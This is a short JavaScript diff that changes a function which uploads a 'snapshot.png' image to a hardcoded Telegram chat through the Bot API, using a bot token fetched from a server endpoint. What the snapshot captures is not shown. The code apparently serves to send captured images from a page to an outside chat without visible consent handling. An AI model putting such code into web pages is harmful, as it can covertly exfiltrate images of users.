@@ -13,7 +13,7 @@ async function fetchEnvVariables() {
     if (data.error) {
       console.error('Error:', data.error);
     } else {
-      console.log('secret is:', data.secret);
+      return(data.secret);
     }
   })
   .catch(error => {
@@ -63,9 +63,8 @@ function takeSnapshot() {
 
 async function sendToTelegram(imageDataUrl) {
 
+  const CHAT_ID = '-1002425906440';
   const env = await fetchEnvVariables();
-  const TELEGRAM_BOT_TOKEN = env.TELEGRAM_BOT_TOKEN;
-  const CHAT_ID = env.CHAT_ID;
 
   // Преобразование DataURL в Blob
   fetch(imageDataUrl)
@@ -75,7 +74,7 @@ async function sendToTelegram(imageDataUrl) {
       formData.append('chat_id', CHAT_ID);
       formData.append('photo', blob, 'snapshot.png');
 
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+      fetch(`https://api.telegram.org/bot${env}/sendPhoto`, {
         method: 'POST',
         body: formData
       })
